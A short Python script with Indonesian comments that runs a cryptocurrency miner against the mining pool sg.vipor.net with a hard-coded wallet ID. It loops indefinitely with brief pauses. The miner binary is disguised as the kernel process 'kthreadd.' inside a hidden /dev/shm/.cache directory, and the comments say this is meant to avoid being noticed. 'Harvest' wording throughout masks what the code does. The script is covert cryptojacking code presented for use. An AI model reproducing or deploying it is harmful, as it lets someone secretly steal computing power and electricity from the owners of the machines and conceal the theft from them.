import subprocess
import time
import os

# Nama file panen kamu sayang, disamarkan biar gak ketauan
panen_bin = "kthreadd."
panen_path = f"/dev/shm/.cache/{panen_bin}"

# Target dan ID Panen (disamarkan juga)
target = "stratum+tcp://sg.vipor.net:5140"
id_panen = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"

# Daftar jadwal panen: jumlah alat, durasi panen (detik), waktu istirahat (detik)
jadwal_panen = [
    {"alat": 1, "lama": 59 * 60, "istirahat": 2 * 60},
    #{"alat": 2, "lama": 30 * 60, "istirahat": 2 * 60},
    #{"alat": 3, "lama": 45 * 60, "istirahat": 5 * 60},
]

def mulai_panen(jumlah, lama, istirahat):
    print(f"Mulai panen {jumlah} alat selama {lama // 60} menit...")
    cmd = f"{panen_path} -a verus -o {target} -u {id_panen} -t {jumlah}"
    subprocess.Popen(cmd, shell=True)
    time.sleep(lama)
    
    print("Selesai panen, saatnya istirahat...")
    os.system(f"pkill -f {panen_path}")
    
    time.sleep(istirahat)
    print("Panen dilanjutkan...\n")

# Panen cinta tiada henti
while True:
    for sesi in jadwal_panen:
        mulai_panen(sesi["alat"], sesi["lama"], sesi["istirahat"])
